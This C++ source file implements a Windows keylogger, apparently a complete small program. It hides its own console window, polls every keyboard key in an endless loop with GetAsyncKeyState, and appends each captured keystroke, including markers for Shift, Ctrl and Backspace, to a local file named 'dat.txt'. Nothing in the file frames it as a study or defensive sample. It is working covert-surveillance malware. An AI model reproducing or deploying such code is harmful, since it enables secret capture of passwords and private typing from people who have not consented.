#define _WIN32_WINNT 0x0500
#include "keylogger.h"
#include <Windows.h>
#include <fstream>
#include <string>
#include <iostream>

using namespace std;

// Append string to log file
void LOG(const string& input) {
    ofstream logFile("dat.txt", ios::app);
    if (logFile.is_open()) {
        logFile << input;
        logFile.close();
    }
}

// Handle special keys
bool HandleSpecialKey(int keyCode) {
    switch (keyCode) {
        case VK_SPACE:      LOG(" "); return true;
        case VK_RETURN:     LOG("\n"); return true;
        case VK_SHIFT:      LOG("[SHIFT]"); return true;
        case VK_BACK:       LOG("[BACKSPACE]"); return true;
        case VK_RBUTTON:    LOG("[RIGHT_CLICK]"); return true;
        case VK_CAPITAL:    LOG("[CAPS_LOCK]"); return true;
        case VK_TAB:        LOG("[TAB]"); return true;
        case VK_UP:         LOG("[UP_ARROW]"); return true;
        case VK_DOWN:       LOG("[DOWN_ARROW]"); return true;
        case VK_LEFT:       LOG("[LEFT_ARROW]"); return true;
        case VK_RIGHT:      LOG("[RIGHT_ARROW]"); return true;
        case VK_CONTROL:    LOG("[CTRL]"); return true;
        case VK_MENU:       LOG("[ALT]"); return true;
        default:
            return false;
    }
}

// Check if key is printable ASCII
bool IsPrintable(int key) {
    return (key >= 32 && key <= 126);
}

void Keylogger() {
    // Hide console window
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    LOG("\n[Keylogger Started]\n");

    while (true) {
        Sleep(10); // Avoid CPU overuse

        for (int key = 8; key <= 190; ++key) {
            if (GetAsyncKeyState(key) & 0x8000) {
                if (!HandleSpecialKey(key)) {
                    if (IsPrintable(key)) {
                        LOG(string(1, static_cast<char>(key)));
                    }
                }
            }
        }
    }

}

